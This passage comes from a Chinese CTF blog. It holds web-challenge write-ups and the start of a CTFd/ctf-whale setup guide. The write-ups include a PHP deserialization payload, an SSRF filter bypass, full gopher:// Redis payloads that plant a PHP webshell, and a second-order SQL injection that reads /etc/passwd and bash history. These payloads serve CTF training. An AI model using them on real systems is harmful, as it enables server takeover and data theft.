comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span></code></pre><p>这里还有小注意点，题目中的php版本为 5.6.40 ，这个版本反序列化对于<code>protected</code>与<code>public</code>类别还是敏感的，可以看到这里是有<code>%00</code>存在的</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135255308.png" class="" title="image-20201218135255308" loading="lazy"><p>可见字符4个，前后都是<code>%00</code>，这时通过数据表传参可能会不准确，例如我本地调会显示如下</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135449017.png" class="" title="image-20201218135449017" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135521199.png" class="" title="image-20201218135521199" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135543020.png" class="" title="image-20201218135543020" loading="lazy"><p>所以我们最后进行<code>urlencode</code>，保证<code>%00</code>正常传入</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135722862.png" class="" title="image-20201218135722862" loading="lazy"><p>最后包含<code>flag.php</code>，拿到flag</p><hr><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>打开题目</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182110711.png" class="" title="image-20201223182110711" loading="lazy"><p>跟url有关，可能是ssrf，命令执行等，先输入<code>127.0.0.1&amp;whoami</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182233706.png" class="" title="image-20201223182233706" loading="lazy"><p>被ban，查看源码发现提示<code>?secret</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182323977.png" class="" title="image-20201223182323977" loading="lazy"><p>发现是linux命令<code>ifconfig</code>内容，考点应该是ssrf打内网</p><p>尝试用<code>file:/</code>读取文件发现被ban，使用 <code>file：/</code>、<code>file:&lt;空格&gt;///</code> 绕过</p><p>读到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//echo $url."\n";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//var_dump($match);</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了<code>file://</code>，<code>dict://</code>，<code>127.0.0.1</code>和<code>localhost</code>，应该是要找本机的服务，爆破下内网同网段下存活主机</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182749451.png" class="" title="image-20201223182749451" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223182807801.png" class="" title="image-20201223182807801" loading="lazy"><p>在<code>10.138.132.10</code>发现提示，爆破其端口，猜测为mysql，redis之类的服务</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184447546.png" class="" title="image-20201223184447546" loading="lazy"><p>在6379端口发现异常，至此明白为redis漏洞</p><p>尝试打redis未授权访问漏洞</p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p>在目标主机上生成<code>shell.php</code>，扫描<code>fla*</code>，以确定flag位置</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184856356.png" class="" title="image-20201223184856356" loading="lazy"><p>排除其他可能，确认flag在根目录，再打</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p><code>cat /flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223185801498.png" class="" title="image-20201223185801498" loading="lazy"><hr><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a><a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a></h2><p>打开题目为留言板，猜测SSTI，sql注入之类的。</p><p>随便留言后跳转登陆界面，sql注入测试无果，看框内字符串，弱密码爆破一波</p><img src="/article/Buuoj-WEB-Write-up/image-20201223193659732.png" class="" title="image-20201223193659732" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203540497.png" class="" title="image-20201223203540497" loading="lazy"><p>爆破密码为<code>zhangwei666</code></p><p>进去尝试SSTI,sql注入无果，但是sql注入语句被过滤。</p><p>站内查找，发现git泄露</p><img src="/article/Buuoj-WEB-Write-up/image-20201223201810099.png" class="" title="image-20201223201810099" loading="lazy"><p><code>writr_do.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>看起来代码肯定是删过的</p><p>然后发现其实原来需要git log 恢复，不得不说，git_extract真香，直接扒出原先的源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键语句<code>select category from board where id=</code>，comment查询类别会进行直接查询，所以为sql二次注入</p><p>留言会进行查询，所以现在就要构造二次注入</p><p>语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token string double-quoted-string">"insert into comment set category = '<span class="token interpolation"><span class="token variable">$category</span></span>', content = '<span class="token interpolation"><span class="token variable">$content</span></span>', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><p>其中变量都可控，由于sql中单句换行，<code>#</code>只能注释单行，所以使用<code>/**/</code>注释</p><p>变为</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '',content=user(),/*',                content = '*/#',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token string double-quoted-string">"insert into comment set category = '',content=user(),/*', content = '*/#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>等价于 <span class="token string double-quoted-string">"insert into comment set category = '',content=user(),#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201223203506275.png" class="" title="image-20201223203506275" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203606551.png" class="" title="image-20201223203606551" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203616701.png" class="" title="image-20201223203616701" loading="lazy"><p>可以执行命令，注入无果， 转而用load_file读取下&#x2F;etc&#x2F;passwd </p><img src="/article/Buuoj-WEB-Write-up/image-20201223204451913.png" class="" title="image-20201223204451913" loading="lazy"><p>www用户有bash执行权限</p><p>读取www用户bash历史记录</p><img src="/article/Buuoj-WEB-Write-up/image-20201223204754524.png" class="" title="image-20201223204754524" loading="lazy"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/<span class="token function">unzip</span> html.zip<span class="token function">rm</span> <span class="token parameter variable">-f</span> html.zip<span class="token function">cp</span> <span class="token parameter variable">-r</span> html /var/www/<span class="token builtin class-name">cd</span> /var/www/html/<span class="token function">rm</span> <span class="token parameter variable">-f</span> .DS_Store<span class="token function">service</span> apache2 start</code></pre><p>所以<code>/tmp/html</code>目录没删，但是不知道目录文件，只知道有个<code>.DS_Store</code></p><p>读取发现是乱码，转用hex编码读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223205134946.png" class="" title="image-20201223205134946" loading="lazy"><p>脚本恢复下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/23 20:52@Auth ： gyy@File ：exp1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> binasciihexdata <span class="token operator">=</span> <span class="token string">""</span>data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>hexdata<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">".DS_Store"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>读取到</p><img src="/article/Buuoj-WEB-Write-up/image-20201223210658137.png" class="" title="image-20201223210658137" loading="lazy"><p>直接读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211015299.png" class="" title="image-20201223211015299" loading="lazy"><p>网鼎杯的题还是很顶的</p><p>后记：</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211725414.png" class="" title="image-20201223211725414" loading="lazy"><p>然后发现答案错误…</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211919615.png" class="" title="image-20201223211919615" loading="lazy"><p>正确方法是取<code>/var/www/html/</code>下的那个文件读，因为动态靶机的缘故，送flag进靶机没有照顾到这题呀…</p><hr>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</title>
      <link href="article/CTFD/"/>
      <url>article/CTFD/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）"><a href="#CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）" class="headerlink" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）"></a>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</h1><h2 id="本篇文章最后更新于2021-2-25"><a href="#本篇文章最后更新于2021-2-25" class="headerlink" title="本篇文章最后更新于2021.2.25"></a>本篇文章最后更新于2021.2.25</h2><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfd可以说是如今最方便的ctf靶场搭建平台，支持各种插件与二次开发，<a href="https://www.zhaoj.in/">赵师傅</a>早前写了一款插件ctf-whale非常方便，但本人在搭建的过程中遇到了不少问题，经过不断研究终于完成，特此记录，以防后期忘记，也供大家交流学习。<br>赵师傅开发的插件是为了适合 <a href="https://buuoj.cn/">buu</a> 的架构,本篇文章采用完整流程+填坑讲解的格式。</p><p>我修改了一份CTFd，已上传github：<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">https://github.com/Err0rCM/CTFd_with_CTFd-whale</a> ，启动后仍需按照教程后半部分配置，省去前半部分时间，如有问题请提issue或者从头自行配置。</p><h4 id="强调！"><a href="#强调！" class="headerlink" title="强调！"></a>强调！</h4><p>由于当时国内git clone实在太慢，因为本人未配好代理，所以采用的方法是科学上网下载zip解压的方式，可自行百度git clong与Download zip的区别。本篇文章是用本地下载zip解压上传的方式完成<strong>在服务器上</strong>搭建</p><p>如果阅读中操作出现问题请自行百度，翻到文末查看坑点讲解或者查看其它搭建文章</p><p>这里感谢赵师傅zhaoj，fjh1997等前辈写的文章指导，读者遇到问题或有不足或缺陷的地方请私信我添加改正</p><h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p><strong>注意</strong>：本机为CentOS7<br>要求：</p><ol><li>已安装基础环境，熟悉linux基本操作</li><li>已安装好 Docker 和 Docker-Compose，并且启用 Docker Swarm，完成换源等操作</li><li>会<em>科学上网</em></li><li>有绝对的耐心</li></ol><p>需求：</p><ol><li>下载赵师傅改写的ctfd，赵师傅已经完成了镜像换源等操作</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd.git -&gt;赵师傅仓库</code></pre><ol start="2"><li>下载frp</li></ol><pre class="language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gz</code></pre><p>也可以直接访问链接下载然后解压上传</p><ol start="3"><li>下载ctf-whale</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale</code></pre><ol start="4"><li>下载docker的frps<br>这里在赵师傅仓库里扒拉发现的<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;Frp-Docker-For-CTFd-Whale</code></pre></li></ol><p>以上除ctfd解压后请确保字母小写，并只有一级文件夹</p><hr><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-docker集群设置"><a href="#1-docker集群设置" class="headerlink" title="1.docker集群设置"></a>1.docker集群设置</h3><p>输入命令</p><pre class="language-none"><code class="language-none">docker swarm initdocker node lsdocker node update --label-add name&#x3D;linux-1 &lt;节点 ID&gt;</code></pre><img src="/article/CTFD/20201017233032375.png" class="" title="docker集群设置" loading="lazy"><p>具体原理等可以查看其它ctfd搭建文章，文末会贴出，这里不做过多阐述</p><h3 id="2-放入ctfd-whale"><a href="#2-放入ctfd-whale" class="headerlink" title="2.放入ctfd-whale"></a>2.放入ctfd-whale</h3><p>将解压的ctfd-whale改小写后放入&#x2F;CTFd&#x2F;CTFd&#x2F;plugins</p><h3 id="3-安装frps（这里有其他教程写的是不对的）"><a href="#3-安装frps（这里有其他教程写的是不对的）" class="headerlink" title="3.安装frps（这里有其他教程写的是不对的）"></a>3.安装frps（这里有其他教程写的是不对的）</h3><p>这里注意下，frp<strong>不是</strong>装在服务器机子上的，简单来说，frps与frpc都是在docker里的。（大坑在这里）<br>frpc是在ctfd里的，frps是在docker机里的</p><p>上传赵师傅的Frp-Docker-For-CTFd-Whale，进入目录后运行<code>docker-compose up -d</code>即可，然后<code>docker ps</code>可看到frps的容器运行中</p><img src="/article/CTFD/202010172331132.png" class="" title="frps" loading="lazy"><p>这里看到frps有28000-28100，这是在<strong>Frp-Docker-For-CTFd-Whale里的docker-compose.yml</strong>，可更改配置后compose</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">frps</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frp<span class="token punctuation">:</span>/conf/    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frps        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frps.ini    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"28000-28100:28000-28100"</span>     <span class="token comment">#可更改开放端口</span>      <span class="token punctuation">-</span> <span class="token string">"6490:6490"</span>    <span class="token comment">#此处必须与frps.ini配置一致</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span></code></pre><p>再看一下&#x2F;frp&#x2F;frps.ini</p><pre class="language-none"><code class="language-none">[common]bind_port &#x3D; 6490token &#x3D; randomme</code></pre><h3 id="4-配置ctfd"><a href="#4-配置ctfd" class="headerlink" title="4.配置ctfd"></a>4.配置ctfd</h3><p>直接上<strong>ctfd的docker-compose.yml</strong>配置</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2.2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">ctfd-nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span><span class="token number">1.17</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./nginx/http.conf<span class="token punctuation">:</span>/etc/nginx/nginx.conf   <span class="token comment">#这里注意</span>    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token comment">#- "85:80"     